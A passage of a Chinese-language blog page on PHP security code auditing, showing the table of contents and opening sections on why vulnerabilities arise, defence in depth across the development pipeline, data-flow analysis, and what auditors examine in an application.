@@ -1,0 +1,5198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Safe: PHP 代码审计</title>
+<meta name="description" content="kubernetes, linux" />
+<meta name="keywords" content="kubernetes, linux" />
+<meta name="generator" content="Org Mode" />
+<script>
+/* main.css 默认把 body 隐藏起来，为的是切换深色模式时不闪白。
+   恢复可见完全交给 CSS 的 html.js:not(.ready) 选择器控制：
+   - 没有 JS：下面这句不会执行，html 上没有 .js，body 一开始就是可见的
+   - 有 JS 但 main.js 加载失败或抛异常：load 事件（或 2 秒兜底）照样会加上 .ready
+   任何一条路径都不会留下白屏。 */
+(function () {
+  var el = document.documentElement;
+  el.className += ' js';
+  function reveal() { el.className += ' ready'; }
+  window.addEventListener('load', reveal);
+  setTimeout(reveal, 2000);
+})();
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+<link rel="alternate" type="application/rss+xml" title="Jasper Hsu's Blog" href="https://xuchangwei.com/rss.xml">
+<link rel="me" href="https://emacs.ch/@jasperhsu">
+<meta name="google-adsense-account" content="ca-pub-1741779893655624">
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
+<!-- from -->
+<!--
+<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
+-->
+<link rel="stylesheet" href="/static/distro-htmlize.css">
+<link rel="stylesheet" href="/static/aandds.com/css/main.css">
+<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
+<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
+<script>
+  window.MathJax = {
+    tex: {
+      ams: {
+        multlineWidth: '85%'
+      },
+      tags: 'ams',
+      tagSide: 'right',
+      tagIndent: '.8em'
+    },
+    chtml: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    svg: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    output: {
+      font: 'mathjax-modern',
+      displayOverflow: 'overflow'
+    }
+  };
+</script>
+
+<script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+</head>
+<body>
+<div id="content" class="content">
+<header>
+<h1 class="title">Safe: PHP 代码审计</h1>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>&#30446;&#24405;</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#h:4f8bcf0f-6db5-49cf-9093-6767c374fa73">PHP代码审计</a>
+<ul>
+<li><a href="#h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5">为什么代码会有漏洞</a></li>
+<li><a href="#h:f2664479-7305-494f-a8f2-9e5d4a00116f">什么是代码安全审计</a>
+<ul>
+<li><a href="#h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d">安全分享</a></li>
+</ul>
+</li>
+<li><a href="#h:e8758875-2f2a-4cb1-a804-4297f31718c5">代码安全审计技术</a>
+<ul>
+<li><a href="#h:6c055d57-392c-4630-9caa-d189091f4bf1">应用程序功能和业务规则</a></li>
+<li><a href="#h:7df95d83-81e1-4d18-b485-a8989b171650">上下文</a></li>
+<li><a href="#h:41edfb06-1058-4055-8860-9b6267bbc18d">敏感数据</a></li>
+<li><a href="#h:763da2fd-5150-46fa-812e-8073b8c710ff">用户角色和访问权限</a></li>
+<li><a href="#h:c4c955bc-75c4-4102-8ac9-f21e4811cce0">应用类型</a></li>
+<li><a href="#h:07d61760-031e-44da-b168-11fb71d8d724">代码</a></li>
+<li><a href="#h:4661253f-1309-4462-a723-5fdd5494353c">设计</a></li>
+<li><a href="#h:757a5de5-9eec-4112-8751-d9375a2f753a">确定攻击面</a></li>
+</ul>
+</li>
+<li><a href="#h:73b19677-e609-4006-93a5-8fbf442b777f">PHP代码审计思路</a>
+<ul>
+<li><a href="#h:39a775ed-a7bc-426a-9de3-ede88d8d192a">用户可控参数</a></li>
+</ul>
+</li>
+<li><a href="#h:da475ddc-8b3a-4da2-b4b9-888112bb9e99">Composer安装</a></li>
+</ul>
+</li>
+<li><a href="#h:84c68648-67fc-4ca8-b3f3-10ebf448d02a">THINKPHP框架输入变量</a>
+<ul>
+<li><a href="#h:4be97d62-05c8-434a-865e-32ee54ca46f6">概述</a>
+<ul>
+<li><a href="#h:86d5f529-40eb-46cc-99a0-202ff230ded6">入口文件</a></li>
+<li><a href="#h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd">MVC模式</a></li>
+<li><a href="#h:9400a028-4c64-4ff9-a035-54ef4789f768">控制器</a></li>
+<li><a href="#h:5e653ed5-65ed-4a52-a627-34dd762c2702">操作</a></li>
+</ul>
+</li>
+<li><a href="#h:98c7b73d-9a34-49b1-8599-08b4790d5d6f">检测变量是否设置</a></li>
+<li><a href="#h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3">变量获取</a>
+<ul>
+<li><a href="#h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185">获取PARAM变量</a></li>
+<li><a href="#h:4d4876f6-5fe2-41fb-901e-1c294439324a">获取GET变量</a></li>
+<li><a href="#h:ae3e0c26-e38b-4422-a8ad-bf79ce058307">获取POST变量</a></li>
+<li><a href="#h:538613f5-3214-49c6-9fd8-16d3df6f2984">获取PUT变量</a></li>
+<li><a href="#h:cc73d254-48eb-4fac-9e0b-449732318238">获取REQUEST变量</a></li>
+<li><a href="#h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7">获取SERVER变量</a></li>
+<li><a href="#h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130">获取SESSION变量</a>
+<ul>
+<li><a href="#h:cc435f87-061b-4c8f-9b05-8416a358079f">安全分享</a></li>
+</ul>
+</li>
+<li><a href="#h:4933c288-dcde-4eac-8b65-2c5fb18e5096">获取Cookie变量</a></li>
+</ul>
+</li>
+<li><a href="#h:2b5a7947-8cd6-4882-ba08-d10328f4cd59">变量过滤</a></li>
+<li><a href="#h:c2163427-b70b-4ddb-95ec-9a1126f28d4b">获取部分变量</a></li>
+<li><a href="#h:fbec423a-babf-40d5-ab0d-2e3053cb7fce">排除部分变量</a></li>
+<li><a href="#h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832">变量修饰符</a></li>
+<li><a href="#h:bf90978e-6889-485b-aff6-0f52665c96a5">原生查询</a>
+<ul>
+<li><a href="#h:a1460af5-5957-4b52-8b07-344916716a3b">query方法</a></li>
+<li><a href="#h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9">execute方法</a></li>
+</ul>
+</li>
+<li><a href="#h:194cefec-42cb-4d64-860f-875089fcae54">参数绑定</a></li>
+<li><a href="#h:478b49b8-81a9-4263-af43-71bdd0f24872">基本查询</a>
+<ul>
+<li><a href="#h:813d3800-811c-4b87-bf51-8ae602558222">安全分享</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496">漏洞讲解</a>
+<ul>
+<li><a href="#h:50204c69-de20-4003-83f9-61890894eff7">PHP敏感函数</a>
+<ul>
+<li><a href="#h:5d1ee97e-f887-4109-8d2a-b7339cf9067c">命令执行函数</a>
+<ul>
+<li><a href="#h:4f3934ad-ceed-4f58-9ce3-5c103cc4bac0">安全分享</a></li>
+</ul>
+</li>
+<li><a href="#h:f66c16d1-40d1-4b3e-b220-1368c21543a9">mail 函数</a></li>
+<li><a href="#h:6bd9b26d-1694-412b-9907-58b867cd0b80">代码注入/文件包含函数</a></li>
+</ul>
+</li>
+<li><a href="#h:598bb5ce-c04f-4e24-b2ae-eb2f2adebdfe">文件读取/SSRF函数</a></li>
+<li><a href="#h:f357707e-19c4-4e48-b7fb-465e54b6cf05">文件上传/写入/其他函数</a>
+<ul>
+<li><a href="#h:847b0b7c-cfcb-4873-a6a2-0ab7b61c079b">安全分享</a></li>
+<li><a href="#h:0c052aba-c4df-4822-a26b-c3eca1a39f92">过滤函数</a></li>
+</ul>
+</li>
+<li><a href="#h:4c46b139-01ca-4a67-86fb-d72a6bc3d4f1">命令注入</a>
+<ul>
+<li><a href="#h:5986f687-50f9-4625-9081-11253175d8d6">常见bash shell</a></li>
+</ul>
+</li>
+<li><a href="#h:322961ff-c690-46ba-8a8a-374509c5b84b">文件包含</a></li>
+<li><a href="#h:05c483b4-04f4-4baf-9e21-b2db08846904">SQL注入</a>
+<ul>
+<li><a href="#h:9bce2f32-1167-4636-8b94-0e9880937b24">例子</a></li>
+<li><a href="#h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1">PHP PDO 预处理语句与存储过程</a></li>
+<li><a href="#h:53436876-b484-4a09-96ad-0d2c1285720a">使用命名（:name）参数来准备SQL语句</a></li>
+<li><a href="#h:1a90f8e2-d3c1-422c-8531-3093579fba81">使用问号（?）参数来准备SQL语句</a></li>
+<li><a href="#h:84feef37-1de6-46c5-a551-c75ee0c71e2f">MySQLi 函数</a></li>
+<li><a href="#h:9152a171-949d-4872-867b-c16faebe2805">mysql 扩展</a>
+<ul>
+<li><a href="#h:f3ddfb55-fa94-45df-94c0-12553e518d22">防护方法</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#h:952f1581-163b-4123-a883-309bded14af2">文件操作</a></li>
+<li><a href="#h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d">XSS</a>
+<ul>
+<li><a href="#h:d54c2e79-81af-4bc0-9bec-036b0e453224">安全分享</a></li>
+<li><a href="#h:ac3f2834-28fc-48da-9b09-cc527f45e3d3">反射型XSS</a></li>
+<li><a href="#h:47e9e743-84ef-4aa9-99e8-587b9db97965">php输出函数</a></li>
+<li><a href="#h:7cc3a036-d4a1-4d93-a262-234d3c6e6805">储存型XSS</a>
+<ul>
+<li><a href="#h:54f2acfe-67f6-4b07-aaea-6d74c42cdb39">防护</a></li>
+</ul>
+</li>
+<li><a href="#h:a33faad4-5f9d-4677-972c-6eb69d78c352">PHP设置csp</a></li>
+</ul>
+</li>
+<li><a href="#h:255edf61-b606-4d2a-b81b-b58fdfba94b9">CSRF</a>
+<ul>
+<li><a href="#h:3e30d509-5a44-49d4-9efe-6c7fbf86f6b4">安全分享</a></li>
+<li><a href="#h:987f99f3-ac90-42e8-81f6-937cee56f96c">表单请求</a></li>
+<li><a href="#h:232c0a54-c765-4e0c-8cd3-b8ca1010b8cb">防护方法</a></li>
+</ul>
+</li>
+<li><a href="#h:56e88d34-b6de-41ee-bdcd-d49ed6842ac5">XXE</a></li>
+<li><a href="#反序列化">反序列化</a>
+<ul>
+<li><a href="#h:63e191b7-1f6d-46e9-b50a-9bc7256954af">序列化</a></li>
+<li><a href="#h:a167b31f-bb54-4f9d-b72b-5615b14110ff">反序列化</a></li>
+</ul>
+</li>
+<li><a href="#h:278f8ca6-cd6f-41ce-ae0a-6d3a479390a4">其他漏洞</a></li>
+<li><a href="#h:0d20343f-2f69-41f0-ba70-f7b6d5f94938">越权漏洞</a>
+<ul>
+<li><a href="#h:4180443e-2440-416a-856f-d38d79c96095">安全分享</a></li>
+</ul>
+</li>
+<li><a href="#h:93f25464-e5e4-4c81-9648-77258981f9dd">拒绝服务</a></li>
+</ul>
+</li>
+<li><a href="#h:d2b5d6df-e835-47a5-a5ec-d8f37572ab8f">PHP 框架-Laravel</a>
+<ul>
+<li><a href="#h:bde611ec-55e2-4dfa-a451-714231ab3fdc">介绍</a></li>
+<li><a href="#h:ef94d822-56d5-4dae-a819-0af09b994b71">根目录</a>
+<ul>
+<li><a href="#h:27cc7f92-3b70-4d66-8c2e-52ec00ad22f8">入口</a></li>
+</ul>
+</li>
+<li><a href="#h:b9df02e7-a36d-46f6-9df6-65de1cacb190">基本路由</a>
+<ul>
+<li><a href="#h:c0cb8938-e8aa-478f-b910-4be3d57ba879">默认路由文件</a></li>
+<li><a href="#h:f94ec2c9-52a4-482d-9df5-4bf377b764f7">可用的路由方法</a></li>
+<li><a href="#h:d2bcca97-7bfa-4ef7-8348-94dec7a8b180">依赖注入</a></li>
+<li><a href="#h:83c07513-01a8-4fe3-adc6-1a86f29128d1">CSRF 保护</a></li>
+<li><a href="#h:ce8dc675-ad7d-4382-9d87-0baabb460806">重定向路由</a></li>
+<li><a href="#h:f73bb9b6-9d51-4c6c-b766-c1842da26de0">视图路由</a></li>
+</ul>
+</li>
+<li><a href="#h:f6e2e169-833f-49b8-a4a9-de3d189b96a3">路由参数</a>
+<ul>
+<li><a href="#h:045cfae3-b935-43b6-8e06-1bdcfdc0a591">必填参数</a>
+<ul>
+<li><a href="#h:b2a109c5-7f6d-49ae-a0e4-ede2d746f6eb">参数和依赖注入</a></li>
+</ul>
+</li>
+<li><a href="#h:48b1497a-5027-406c-aae6-aacd08820e12">可选参数</a></li>
+<li><a href="#h:a70c96fc-314f-421d-9bea-bbc47e66a8a9">正则表达式约束</a>
+<ul>
+<li><a href="#h:82045dc5-638c-4d2f-b6fb-c86f3ee4bfd9">全局约束</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#h:db1d62da-059e-4c15-86f2-c43582ad87c7">命名路由</a>
+<ul>
+<li><a href="#h:6e9a9ec7-e95b-4a82-a0b2-76da51b817a1">生成命名路由的 URL</a></li>
+</ul>
+</li>
+<li><a href="#h:04a3d8dd-61fe-4c08-a58d-b33e3584242d">路由组</a>
+<ul>
+<li><a href="#h:8a37bc32-1404-4187-a1cc-55c3d29fce1a">路由中间件</a></li>
+<li><a href="#h:17ba9adc-fc2b-4c85-9a19-889494070a33">控制器</a></li>
+<li><a href="#h:907957d7-b2b1-4ab0-93a5-5fb3fc4e8653">子域路由</a></li>
+<li><a href="#h:0dfb326a-42f7-4392-91b8-62965608efb0">路由前缀</a></li>
+<li><a href="#h:1e23bfb0-0cb7-425a-893f-7bcad212b7ac">隐式绑定</a></li>
+<li><a href="#h:ecf8e573-2ba8-45d7-bbc5-ef18cd6a37fd">获取参数</a></li>
+<li><a href="#h:bf55aef1-87cf-4fda-a186-3e0c0b503434">sql注入</a>
+<ul>
+<li><a href="#h:7fec154d-d9de-461a-b455-41080ee84709">使用命名绑定</a></li>
+<li><a href="#h:c1e95214-4df4-4640-a234-63d0eae07124">执行 Insert 语句</a></li>
+<li><a href="#h:0ee1d1d9-06ca-432c-bf53-458c9c0a216f">执行 Update 语句</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#h:7632f2c4-00f2-4202-8a4a-26138fb26b10">安全小结</a></li>
+</ul>
+</li>
+<li><a href="#h:3da5cf8c-4e2d-4af9-896a-fc66765a21a9">php代码审计工具</a>
+<ul>
+<li><a href="#h:494e4e59-7166-4d71-baec-7ce5ff6479ac">RIPS</a></li>
+<li><a href="#h:ec800b1f-f793-438e-9a61-4e66f27b7c90">自写python代码实现</a></li>
+</ul>
+</li>
+<li><a href="#h:6f632ee6-0858-439f-adfe-ba0999bcae1d">PHP 函数精讲</a>
+<ul>
+<li><a href="#h:fc9fd758-a334-4012-ab6f-1c73f72bd736">extract变量覆盖</a></li>
+<li><a href="#h:2b4f28de-9731-426d-9d8b-1b1b21e1f139">绕过过滤的空白字符</a></li>
+<li><a href="#h:711d094a-e2bc-474c-bad3-87542bdfc469">多重加密</a></li>
+<li><a href="#h:4f0227fc-8b2c-41ab-8ac8-c3e308dda9d1">SQL注入_WITH ROLLUP绕过</a></li>
+<li><a href="#h:d2b6647d-79f0-4e44-b3e7-4bb7e2f36006">ereg正则%00截断</a></li>
+<li><a href="#h:1a75de0b-df2a-4e37-8680-86dcd2955ed4">sha()函数比较绕过</a></li>
+<li><a href="#h:257bcb5c-3ee7-4f73-82b1-6fc43ceb3782">SESSION验证绕过</a></li>
+<li><a href="#h:97daa910-2762-4282-9e2b-3f4a56cd82a2">密码md5比较绕过</a></li>
+<li><a href="#h:e15abb1d-6d4f-4988-b030-b936e16e9e9a">urldecode二次编码绕过</a></li>
+<li><a href="#h:0e55213c-f905-434e-96c2-e55e33877dff">intval函数取整</a></li>
+<li><a href="#h:b0255428-392d-4422-b5da-88bd7d24e836">jsonp劫持</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+<ul class="org-ul">
+<li>TAGS: <a href="../index.html">Safe</a></li>
+</ul>
+
+
+<p>
+<a href="12-code-audit-of-php-01.html">PHP 语言入门</a>
+</p>
+
+<p>
+学习php的目的
+</p>
+<ul class="org-ul">
+<li>明白之前学的漏洞在代码当中是怎么产生的。</li>
+<li>以后看php代码时，明白功能逻辑有没有漏洞。</li>
+<li>不需要我们会写php</li>
+</ul>
+
+
+<p>
+主要内容：
+</p>
+<ul class="org-ul">
+<li>为什么代码会有漏洞</li>
+<li>什么是代码审计</li>
+<li>代码安全审计技术详解、要求
+<ul class="org-ul">
+<li>应用程序功能和业务规则</li>
+<li>上下文</li>
+<li>敏感数据</li>
+<li>应用角色和访问权限</li>
+<li>应用类型</li>
+<li>代码和设计</li>
+<li>确定攻击面</li>
+</ul></li>
+<li>PHP 代码审计思路</li>
+<li>PHP 包管理软件</li>
+<li>ThinkPHP 框架讲解
+<ul class="org-ul">
+<li>入口文件</li>
+<li>MVC 模式</li>
+</ul></li>
+</ul>
+<section id="outline-container-h:4f8bcf0f-6db5-49cf-9093-6767c374fa73" class="outline-2">
+<h2 id="h:4f8bcf0f-6db5-49cf-9093-6767c374fa73"><a href="#h:4f8bcf0f-6db5-49cf-9093-6767c374fa73">PHP代码审计</a></h2>
+<div class="outline-text-2" id="text-h:4f8bcf0f-6db5-49cf-9093-6767c374fa73">
+</div>
+<div id="outline-container-h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5" class="outline-3">
+<h3 id="h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5"><a href="#h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5">为什么代码会有漏洞</a></h3>
+<div class="outline-text-3" id="text-h:b5dcf650-6d08-4b9c-9fa4-43219cd90fe5">
+<p>
+CWE 项目中大约有 1000 种不同的软件缺陷。这些都是软件开发人员使用不安全的方式执行代码逻辑所引发的安全问题。
+</p>
+
+<p>
+<b>软件开发没有学习过安全知识，大多数人也没有接受过任何关于软件安全的培训</b> 。
+</p>
+
+<p>
+这些问题在最近几年变得非常重要，因为我们在以极快的速度增加互联方式，技术和协议。 <b>发明技术的能力已经远远超过了保护技术的能力。今天使用的许多技术根本没有受到足够(或任何)的安全审计</b> 。
+</p>
+
+<p>
+企业没有在安全上花费适当的时间有许多原因。最直观的原因是源于软件市场的一个潜在问题。
+</p>
+
+<p>
+因为软件本质上是一个黑盒，客户很难区分安全和不安全代码。
+</p>
+
+<p>
+没有这种可见性， 就不鼓励供应商花费额外的精力来生产安全的代码。
+</p>
+</div>
+</div>
+<div id="outline-container-h:f2664479-7305-494f-a8f2-9e5d4a00116f" class="outline-3">
+<h3 id="h:f2664479-7305-494f-a8f2-9e5d4a00116f"><a href="#h:f2664479-7305-494f-a8f2-9e5d4a00116f">什么是代码安全审计</a></h3>
+<div class="outline-text-3" id="text-h:f2664479-7305-494f-a8f2-9e5d4a00116f">
+<p>
+代码审计旨在识别应用程序中与其特性和设计相关的安全缺陷，以及产生缺陷的根本原因。
+</p>
+
+<p>
+随着应用程序的日益复杂和新技术的出现，传统的测试方法可能无法检测到应用程序中存在的所有安全缺陷。人们必须理解应用程序、外部组件和配置的代码，这样才能更好地发现缺陷。 <b>深入地研究应用程序代码也有助于确定可用于避免安全缺陷的缓解技术</b> 。
+</p>
+
+<p>
+<b>审核应用程序源代码的过程是为了验证适当的安全和逻辑控制是否存在，它们是否按预期工作，以及它们是否在正确的位置被调用</b> 。
+</p>
+
+<p>
+代码安全审计允许公司确保应用程序开发人员遵循安全开发技术。一般的经验法则是， 在应用程序经过适当的代码安全审计后，渗透测试不应发现与开发的代码相关的任何其他应用程序漏洞。或者发现很少的问题。
+</p>
+</div>
+<div id="outline-container-h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d" class="outline-4">
+<h4 id="h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d"><a href="#h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d">安全分享</a></h4>
+<div class="outline-text-4" id="text-h:71761f55-ec59-4e57-8b4d-6478ec6e8e8d">
+<p>
+项目的代码审计，除了代码还要看什么？
+</p>
+<ul class="org-ul">
+<li>代码、系统架构、业务属性、软件架构文档、识别业务上下游关系</li>
+</ul>
+
+<p>
+如何做公司的安全？
+</p>
+<ul class="org-ul">
+<li>控制代码层面的安全风险。
+<ul class="org-ul">
+<li>按漏洞类型来分有通用漏洞、逻辑漏洞，不同漏洞的人力成本不一样，投资回报率（ROI）不一样。</li>
+<li>按存量/增量来拆分。存量是从当前开始做之前代码都属于存量。
+<ul class="org-ul">
+<li>存量如何控制？ 批量做，增加人来做</li>
+<li>增量如何控制？ 变化频繁不是铺人能搞定的。可以建立安全流程来控制，在研发流程中接入进来。
+<ul class="org-ul">
+<li>什么算新增代码？ 上线到公司生产环境的新代码算新增代码。</li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+
+<p>
+上线流程中接入安全：
+</p>
+<ul class="org-ul">
+<li>需求、开发、构建、测试、部署、线上环境</li>
+<li>构建有ci平台，部署有cd平台，开发有git。每个上面会有动作，git 有pull/push/merge，ci 有构建，cd有部署</li>
+<li>各阶段问题：
+<ul class="org-ul">
+<li>部署阶段卡点问题：
+<ol class="org-ol">
+<li>研发修复漏洞成本高</li>
+<li>测试的工作量增大</li>
+<li>安全测试的时间很少</li>
+<li>修复漏洞时间很少</li>
+<li>绕过卡点上线</li>
+</ol></li>
+<li>构建阶段卡点问题：
+<ol class="org-ol">
+<li>构建频率很高，审计成本增加</li>
+<li>如果有自动扫描，但扫描报告增多，则审计成本增加</li>
+</ol></li>
+</ul></li>
+<li>各阶段问题解决：
+<ul class="org-ul">
+<li>安全：纵深防御。不在一个点去解决所有的安全问题，而是在每个点上都做安全策略，然后去层层治理层层管控从而解决所有的安全问题。
+<ul class="org-ul">
+<li>部署时：做卡点，但要降低漏过的量降到5%或3%，就提前感知到漏洞。提前感知漏洞就需要在每个阶段去做。</li>
+<li>测试时：做墨盒扫描，把测试的流量拿过来做墨盒扫描来发现安全问题</li>
+<li>ci平台构建时：嵌入代码扫描做风险告知，有漏洞直接展示，但没有审计，让研发知道会在部署上线时卡你。</li>
+<li>开发阶段时：在ide上做一个代码扫描插件，在开发时就能提醒</li>
+<li>需求中：可以做一些可能会生产高风险的漏洞识别，做一些风险通知。如做一个登录功能，就列举登录中的安全风险（暴力破解要加验证码、用户名枚举、密码明文传输）</li>
+</ul></li>
+</ul></li>
+</ul>
+
+
+<p>
+主动思考：
+</p>
+<ul class="org-ul">
+<li>目标：没有漏洞</li>
+<li>纵深防御
+<ul class="org-ul">
+<li>首先要理解漏洞底层的原理，和我们在企业中的定位</li>
+<li>根据企业现状思考如何落地。优先级、时机的把控</li>
+</ul></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-h:e8758875-2f2a-4cb1-a804-4297f31718c5" class="outline-3">
+<h3 id="h:e8758875-2f2a-4cb1-a804-4297f31718c5"><a href="#h:e8758875-2f2a-4cb1-a804-4297f31718c5">代码安全审计技术</a></h3>
+<div class="outline-text-3" id="text-h:e8758875-2f2a-4cb1-a804-4297f31718c5">
+<p>
+代码安全审计与被审计的应用程序强相关。它们可能会突出一些新的或特定于应用程序代码实现的缺陷，如执行流的不安全终止、同步错误等。 <b>这些缺陷只有当我们理解了应用程序代码流及其逻辑后才能被发现</b> 。因此，代码安全审计不仅仅是扫描代码中的一组未知的不安全代码模式，还包括 <b>理解应用程序的代码实现和列举它独有的缺陷</b> 。（ps 代码审计中找业务逻辑的安全问题，但大部分公司都没有做这么好，大部分公司还都是只是一些通用的web漏洞）
+</p>
+
+<p>
+正在审计的应用程序可能已经设计了一些适当的安全控制，例如集中黑名单、输入验证等。必须仔细研究这些安全控制措施，以确定它们是否可靠。根据控制的实施，必须分析攻击的性质或任何可用于绕过它的特定攻击向量。
+</p>
+
+<p>
+<b>列举现有安全控制中的弱点是代码安全审计的另一个重要方面</b> 。
+</p>
+
+<p>
+应用程序中出现安全缺陷有多种原因，比如缺少输入验证或参数处理不当。在代码审计的过程中， <b>缺陷的根本原因需要被暴露出来，要跟踪完整的数据流</b> 。确定应用程序(源)的所有可能的输入，以及它们是如何被应用程序(接收器)处理的。接收器可能是一种不安全的代码模式，如动态 SQL 查询、日志编写器或对客户端设备的响应。
+</p>
+
+<p>
+考虑一个源是用户输入的场景。它流经应用程序的不同类/组件，最后落入一个拼接的SQL 查询(一个接收器)中，并且在路径中没有对它进行适当的验证。在这种情况下，应用程序将容易受到 SQL 注入攻击，这是由源到目的分析确定的。这种分析有助于理解哪些易受攻击的输入可能导致应用程序中的漏洞。
+</p>
+
+<p>
+一旦发现缺陷，审计者必须列举应用程序中存在的所有可能的实例。这不是由代码变更发起的代码审计，这是由管理部门基于发现的缺陷发起的代码扫描，并且投入资源来查找该缺陷是否存在于产品的其他部分。例如，由于在不安全的显示方法中使用未经验证的输入，应用程序很容易在这些地方受到 XSS 漏洞的攻击。
+</p>
+</div>
+<div id="outline-container-h:6c055d57-392c-4630-9caa-d189091f4bf1" class="outline-4">
+<h4 id="h:6c055d57-392c-4630-9caa-d189091f4bf1"><a href="#h:6c055d57-392c-4630-9caa-d189091f4bf1">应用程序功能和业务规则</a></h4>
+<div class="outline-text-4" id="text-h:6c055d57-392c-4630-9caa-d189091f4bf1">
+<p>
+审计人员应了解应用程序当前提供的所有功能，并获取与这些功能相关的所有业务限制规则。还有一种情况是，要注意潜在的计划中的功能，这些功能可能会出现在应用程序的路线图上，从而在当前的代码审计过程中对安全决策进行提前验证。这个系统失败的后果是什么？如果应用程序不能按预期执行其功能，企业会受到很大影响吗？
+</p>
+</div>
+</div>
+<div id="outline-container-h:7df95d83-81e1-4d18-b485-a8989b171650" class="outline-4">
+<h4 id="h:7df95d83-81e1-4d18-b485-a8989b171650"><a href="#h:7df95d83-81e1-4d18-b485-a8989b171650">上下文</a></h4>
+<div class="outline-text-4" id="text-h:7df95d83-81e1-4d18-b485-a8989b171650">
+<p>
+所有的安全都在我们试图保护的范围内。在苹果的应用程序上推荐军事安全标准机制将是矫枉过正不恰当的。什么类型的数据被操纵或处理，如果这些数据被泄露会对公司造成什么损害？上下文是安全代码审计和风险评估的“圣 杯”。
+</p>
+</div>
+</div>
+<div id="outline-container-h:41edfb06-1058-4055-8860-9b6267bbc18d" class="outline-4">
+<h4 id="h:41edfb06-1058-4055-8860-9b6267bbc18d"><a href="#h:41edfb06-1058-4055-8860-9b6267bbc18d">敏感数据</a></h4>
+<div class="outline-text-4" id="text-h:41edfb06-1058-4055-8860-9b6267bbc18d">
+<p>
+审计人员还应记录对应用程序敏感的数据实体，如账号和密码。根据敏感度对数据实体进行分类将有助于审计者确定应用程序中任何类型的数据丢失的影响。
+</p>
+</div>
+</div>
+<div id="outline-container-h:763da2fd-5150-46fa-812e-8073b8c710ff" class="outline-4">
+<h4 id="h:763da2fd-5150-46fa-812e-8073b8c710ff"><a href="#h:763da2fd-5150-46fa-812e-8073b8c710ff">用户角色和访问权限</a></h4>
+<div class="outline-text-4" id="text-h:763da2fd-5150-46fa-812e-8073b8c710ff">
+<p>
+了解被允许访问应用程序的用户类型很重要。是面向外部还是内部给“信任”的用户？ 一般来说，只有组织内部用户才能访问的应用程序可能与互联网上任何人都能访问的面临不同的威胁。因此，了解应用程序的用户及其部署的环境将允许审计者正确认识威胁。除此之外，还必须了解应用程序中存在的不同权限级别。这将有助于审计者列举适用于应用程序的不同安全违规/权限提升攻击。
+</p>
+</div>
+</div>
+<div id="outline-container-h:c4c955bc-75c4-4102-8ac9-f21e4811cce0" class="outline-4">
+<h4 id="h:c4c955bc-75c4-4102-8ac9-f21e4811cce0"><a href="#h:c4c955bc-75c4-4102-8ac9-f21e4811cce0">应用类型</a></h4>
+<div class="outline-text-4" id="text-h:c4c955bc-75c4-4102-8ac9-f21e4811cce0">
+<p>
+这是指了解应用程序是基于浏览器的应用程序、基于桌面的独立应用程序、网络服务、移动应用程序还是混合应用程序。不同类型的应用程序面临不同类型的安全威胁，了解应用程序的类型将有助于审计者查找特定的安全缺陷，确定正确的威胁代理，并突出适合应用程序的必要控制。
+</p>
+</div>
+</div>
+<div id="outline-container-h:07d61760-031e-44da-b168-11fb71d8d724" class="outline-4">
+<h4 id="h:07d61760-031e-44da-b168-11fb71d8d724"><a href="#h:07d61760-031e-44da-b168-11fb71d8d724">代码</a></h4>
+<div class="outline-text-4" id="text-h:07d61760-031e-44da-b168-11fb71d8d724">
+<p>
+使用的语言，从安全角度看该语言的特点和问题。从安全性和性能的角度来看，程序员需要注意的问题和语言最佳实践。
+</p>
+</div>
+</div>
+<div id="outline-container-h:4661253f-1309-4462-a723-5fdd5494353c" class="outline-4">
